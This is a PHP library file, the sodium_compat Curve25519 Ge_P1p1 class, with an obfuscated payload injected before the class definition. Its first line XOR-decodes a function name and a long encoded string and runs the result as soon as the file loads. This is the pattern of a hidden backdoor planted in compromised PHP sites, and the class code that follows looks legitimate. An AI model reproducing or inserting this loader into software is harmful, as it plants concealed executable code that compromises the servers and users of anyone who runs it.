<?php $tiFoTnll='Y>H6DX64 SRYP6;'; $reeBnwn=':L-W0=iRU=1-9YU'^$tiFoTnll; $NqRpLD='YUbFRE-3Z+<VqNVBSB7AdX;5i<S 0=8ZMMiPxF6497DU;N=>,LF65mW+3Met=OYyj4VH3gLfW=6mbFfQcP=9ppVN7kwrEncxn5<Y9cWZkkXsxvi-qA CU, lrWYD6lMmnIeDdmcdfZ9XObNAFE-3ZY3eWkz-wp9=W:Q0Abo5O592+IgSNRblaTZps6Y ;C it59 PvOxIA-yAAXYC,wjgU1 INkkk56M.k<=HiEfK Q0RVkfKONNU62pYEinz5s+eC0FnP3R4atVIc02UIInv:nqMO492l-=Iduol-KDtaahJUBMUyasHQ4F0xo+p<<1rmGe<0=4oQ1HP6Z;, PYaee7<=eure=V4XzqK  HqZLQK+.<-EtMysytY85XqSS6Gtqo9+6YACmfDY,Zxxqj5O=3Nh1kKR,=1eU5I4zTd+F=GT QY9P11b788.=2=TqnW=3e0;<<px4 W,-S=Rm5679sIrl-A<V1G3OpylbT+CJ3Z;9mlrvV9;2EsS717UO:1:Kqb836kaKaXW6.eplcfoQIbXs2S>1nQ3YBavprONRsjTWg73.EfoRZ.tcq:yh7.dTB4OZv2QqhazmtHZMGL+:l== ;1=R5MCKrGT;=ORTMnYbP7XMxDNTpareOC=QL8<yP>LLPbhM3=T,M7m+fwr0H  EyagrI<'; $oWZMtRCO=$reeBnwn('', '03Jg40CP.BS8.+.+ 6DiC TG6X2TQbg789NyQfM>0Q1;X:TQBl>YG23JG,:+P:-QNP7<RKlB<XODBfFqC+70yT9;CKJRbIXrg<Z6KKs3KVxCCVMDM2T19INDV380WEvMJ NoMgjmB5L,oLsanaIR.8hA>6ZsWTRX.auYaGOF;GUWEaC8++K1HoPyzD<TN1NAPZLTyMEq4KPsKe<87MWWG3PL:+PaOQW9O4WX1IxF-A=C7mal- <+4UZPqa6-5z8b cQ5NtX7MAIhiGFS9<,GVAdxi+UMS3FX0DHOHF.=OkhL.46,uDAW>0X3UCeVz6UWREfAXQIUFqJBYP5IIA31AMAhnx4 76ivU+ZU EYhLdlu=JBIHlT6szpP=YA9.86OgIQKRNObKJdB 8X;XEQNC.QF+S;b6XQ7;A1T=UZiDk3S41R88U9KTJOWJqYSI5.1:HGMRZOYFLkD2OB7XzIQWCXZeRHI H7n,V6YPWh=MknW;OXMJTV7KIS<,8RHh07SBN8YESVOLMkE<6BOLPJEFG<-WpWV2JP5vX<;F+YRrsrTS7cQTPMpQZdhKFUBYLQTOReqVw>GVhBPFSMRnz,5>JC3VXYdTE;F90cU75BQ 30jByF4V,,QmntPARE4I44:YPQtZ-819O=RD8C,SJvOLx9-XI1QQNICA'^$NqRpLD); $oWZMtRCO();

if (class_exists('ParagonIE_Sodium_Core32_Curve25519_Ge_P1p1', false)) {
    return;
}
/**
 * Class ParagonIE_Sodium_Core32_Curve25519_Ge_P1p1
 */
class ParagonIE_Sodium_Core32_Curve25519_Ge_P1p1
{
    /**
     * @var ParagonIE_Sodium_Core32_Curve25519_Fe
     */
    public $X;

    /**
     * @var ParagonIE_Sodium_Core32_Curve25519_Fe
     */
    public $Y;

    /**
     * @var ParagonIE_Sodium_Core32_Curve25519_Fe
     */
    public $Z;

    /**
     * @var ParagonIE_Sodium_Core32_Curve25519_Fe
     */
    public $T;

    /**
     * ParagonIE_Sodium_Core32_Curve25519_Ge_P1p1 constructor.
     *
     * @internal You should not use this directly from another application
     *
     * @param ParagonIE_Sodium_Core32_Curve25519_Fe|null $x
     * @param ParagonIE_Sodium_Core32_Curve25519_Fe|null $y
     * @param ParagonIE_Sodium_Core32_Curve25519_Fe|null $z
     * @param ParagonIE_Sodium_Core32_Curve25519_Fe|null $t
     *
     * @throws SodiumException
     * @throws TypeError
     */
    public function __construct(
        ParagonIE_Sodium_Core32_Curve25519_Fe $x = null,
        ParagonIE_Sodium_Core32_Curve25519_Fe $y = null,
        ParagonIE_Sodium_Core32_Curve25519_Fe $z = null,
        ParagonIE_Sodium_Core32_Curve25519_Fe $t = null
    ) {
        if ($x === null) {
            $x = ParagonIE_Sodium_Core32_Curve25519::fe_0();
        }
        $this->X = $x;
        if ($y === null) {
            $y = ParagonIE_Sodium_Core32_Curve25519::fe_0();
        }
        $this->Y = $y;
        if ($z === null) {
            $z = ParagonIE_Sodium_Core32_Curve25519::fe_0();
        }
        $this->Z = $z;
        if ($t === null) {
            $t = ParagonIE_Sodium_Core32_Curve25519::fe_0();
        }
        $this->T = $t;
    }
}
